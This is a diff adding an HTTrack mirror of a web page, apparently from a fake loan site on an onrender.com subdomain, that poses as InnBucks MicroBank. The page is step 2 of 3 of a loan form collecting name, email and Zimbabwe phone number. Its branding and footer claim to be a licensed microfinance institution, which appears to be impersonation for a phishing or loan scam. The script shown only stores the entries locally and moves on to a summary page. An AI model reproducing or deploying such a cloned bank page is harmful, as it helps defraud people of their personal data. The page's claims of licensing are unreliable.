@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from innbucks2026loan.onrender.com/details by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 25 Feb 2026 12:54:29 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>InnBucks – Personal Details</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family: 'Inter', system-ui, sans-serif;
+            background: #f8f9fa;
+            color: #1a1a1a;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        header {
+            background: #13294B;
+            color: white;
+            padding: 1.2rem 5%;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.12);
+        }
+        .header-container {
+            max-width: 1100px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .back-btn {
+            font-size: 2rem;
+            background: none;
+            border: none;
+            color: white;
+            cursor: pointer;
+            padding: 0 0.5rem;
+        }
+        .logo {
+            font-size: 2rem;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+        .logo-inn { color: #BB2D3B; }
+        .logo-bucks { color: white; }
+
+        main {
+            flex: 1;
+            padding: 2rem 5% 3rem;
+            max-width: 620px;
+            margin: 0 auto;
+            width: 100%;
+        }
+        .form-card {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.08);
+            padding: 2.2rem 2rem;
+            border: 1px solid #e0e0e0;
+        }
+        .form-title {
+            font-size: 1.75rem;
+            font-weight: 700;
+            color: #13294B;
+            text-align: center;
+            margin-bottom: 1.5rem;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #e2e8f0;
+            border-radius: 4px;
+            margin: 1.5rem auto 1rem;
+            overflow: hidden;
+        }
+        .progress-fill {
+            width: 66.66%;
+            height: 100%;
+            background: #BB2D3B;
+            border-radius: 4px;
+        }
+        .step-text {
+            text-align: center;
+            color: #64748b;
+            font-size: 1rem;
+            margin-bottom: 2rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.8rem;
+            position: relative;
+        }
+        .form-label {
+            display: block;
+            font-weight: 500;
+            color: #334155;
+            margin-bottom: 0.6rem;
+            font-size: 0.95rem;
+        }
+        .form-input {
+            width: 100%;
+            padding: 1rem 1.2rem;
+            border: 1px solid #cbd5e1;
+            border-radius: 10px;
+            font-size: 1rem;
+            background: #fff;
+            transition: all 0.2s;
+        }
+        .form-input:focus {
+            border-color: #BB2D3B;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(187,45,59,0.15);
+        }
+        .invalid {
+            border-color: #e11d48 !important;
+            box-shadow: 0 0 0 3px rgba(225,29,72,0.15) !important;
+        }
+        .field-error {
+            color: #991b1b;
+            font-size: 0.875rem;
+            margin-top: 0.4rem;
+            display: none;
+        }
+
+        .phone-group {
+            display: flex;
+            align-items: center;
+            border: 1px solid #cbd5e1;
+            border-radius: 10px;
+            padding: 0 1.2rem;
+            transition: all 0.2s;
+        }
+        .phone-group.invalid {
+            border-color: #e11d48 !important;
+            box-shadow: 0 0 0 3px rgba(225,29,72,0.15) !important;
+        }
+        .phone-prefix {
+            color: #64748b;
+            font-size: 1rem;
+            margin-right: 0.8rem;
+            font-weight: 500;
+        }
+        .phone-input {
+            flex: 1;
+            border: none;
+            outline: none;
+            padding: 1rem 0;
+            font-size: 1rem;
+            background: transparent;
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 1rem;
+            margin-top: 2.5rem;
+        }
+        .prev-btn, .next-btn {
+            flex: 1;
+            padding: 1.15rem;
+            border-radius: 12px;
+            font-size: 1.15rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .prev-btn {
+            background: #e2e8f0;
+            color: #475569;
+            border: none;
+        }
+        .prev-btn:hover {
+            background: #cbd5e1;
+        }
+        .next-btn {
+            background: #BB2D3B;
+            color: white;
+            border: none;
+        }
+        .next-btn:hover {
+            background: #a02432;
+            transform: translateY(-2px);
+            box-shadow: 0 12px 28px rgba(187,45,59,0.25);
+        }
+
+        footer {
+            background: #13294B;
+            color: #ddd;
+            padding: 2rem 5% 1.5rem;
+            text-align: center;
+            font-size: 0.9rem;
+            border-top: 4px solid #BB2D3B;
+        }
+
+        @media (min-width: 768px) {
+            .form-card { padding: 2.8rem 3.5rem; }
+            .form-title { font-size: 2rem; }
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="header-container">
+        <button class="back-btn" onclick="history.back()">←</button>
+        <div class="logo"><span class="logo-inn">Inn</span><span class="logo-bucks">Bucks</span></div>
+    </div>
+</header>
+
+<main>
+    <div class="form-card">
+        <h1 class="form-title">Personal Details</h1>
+        <div class="progress-bar"><div class="progress-fill"></div></div>
+        <div class="step-text">Step 2 of 3</div>
+
+        <div class="name-group" style="display: flex; gap: 1.2rem; margin-bottom: 1.8rem;">
+            <div style="flex: 1;">
+                <label class="form-label">First Name</label>
+                <input type="text" class="form-input" id="firstName" placeholder="John">
+                <div class="field-error" id="firstNameError">Please enter your first name.</div>
+            </div>
+            <div style="flex: 1;">
+                <label class="form-label">Last Name</label>
+                <input type="text" class="form-input" id="lastName" placeholder="Doe">
+                <div class="field-error" id="lastNameError">Please enter your last name.</div>
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label class="form-label">Email Address</label>
+            <input type="email" class="form-input" id="email" placeholder="john.doe@example.com">
+            <div class="field-error" id="emailError">Please enter a valid email address.</div>
+        </div>
+
+        <div class="form-group">
+            <label class="form-label">Phone Number</label>
+            <div class="phone-group" id="phoneGroup">
+                <span class="phone-prefix">+263</span>
+                <input type="tel" class="phone-input" id="phone" placeholder="771234567" maxlength="9">
+            </div>
+            <div class="field-error" id="phoneError">Please enter a valid 9-digit Zimbabwe phone number (e.g. 771234567).</div>
+            <small style="color:#64748b; display:block; margin-top:0.5rem; font-size:0.875rem;">
+                Enter 9 digits only (no spaces or +263)
+            </small>
+        </div>
+
+        <div class="btn-group">
+            <button class="prev-btn" onclick="history.back()">PREVIOUS</button>
+            <button class="next-btn" id="nextBtn">NEXT STEP</button>
+        </div>
+    </div>
+</main>
+
+<footer>
+    © 2026 InnBucks MicroBank Pvt Ltd. Licensed Deposit-Taking Microfinance Institution.<br>
+    Member of the Deposit Protection Scheme • Terms & Conditions apply • Dial *569#
+</footer>
+
+<script>
+    // Pre-fill from localStorage
+    if (localStorage.getItem('firstName')) document.getElementById('firstName').value = localStorage.getItem('firstName');
+    if (localStorage.getItem('lastName')) document.getElementById('lastName').value = localStorage.getItem('lastName');
+    if (localStorage.getItem('email')) document.getElementById('email').value = localStorage.getItem('email');
+    if (localStorage.getItem('phone')) document.getElementById('phone').value = localStorage.getItem('phone');
+
+    const firstNameError = document.getElementById('firstNameError');
+    const lastNameError  = document.getElementById('lastNameError');
+    const emailError     = document.getElementById('emailError');
+    const phoneError     = document.getElementById('phoneError');
+    const phoneGroup     = document.getElementById('phoneGroup');
+
+    document.getElementById('nextBtn').addEventListener('click', function() {
+        const firstName = document.getElementById('firstName').value.trim();
+        const lastName  = document.getElementById('lastName').value.trim();
+        const email     = document.getElementById('email').value.trim();
+        const phone     = document.getElementById('phone').value.trim();
+
+        // Reset errors
+        firstNameError.style.display = 'none';
+        lastNameError.style.display  = 'none';
+        emailError.style.display     = 'none';
+        phoneError.style.display     = 'none';
+        document.querySelectorAll('.form-input, #phoneGroup').forEach(el => el.classList.remove('invalid'));
+
+        let valid = true;
+
+        if (!firstName) {
+            document.getElementById('firstName').classList.add('invalid');
+            firstNameError.style.display = 'block';
+            valid = false;
+        }
+        if (!lastName) {
+            document.getElementById('lastName').classList.add('invalid');
+            lastNameError.style.display = 'block';
+            valid = false;
+        }
+        if (!email || !email.includes('@') || !email.includes('.')) {
+            document.getElementById('email').classList.add('invalid');
+            emailError.style.display = 'block';
+            valid = false;
+        }
+        if (!phone || phone.length !== 9 || !/^\d{9}$/.test(phone)) {
+            phoneGroup.classList.add('invalid');
+            phoneError.style.display = 'block';
+            valid = false;
+        }
+
+        if (!valid) {
+            // No alert — errors are shown inline below each field
+            // Optional: scroll to first error
+            document.querySelector('.invalid')?.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            return;
+        }
+
+        // Save to localStorage
+        localStorage.setItem('firstName', firstName);
+        localStorage.setItem('lastName', lastName);
+        localStorage.setItem('email', email);
+        localStorage.setItem('phone', phone);
+
+        window.location.href = 'summary.html';
+    });
+</script>
+
+</body>
+
+<!-- Mirrored from innbucks2026loan.onrender.com/details by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 25 Feb 2026 12:54:31 GMT -->
+</html>
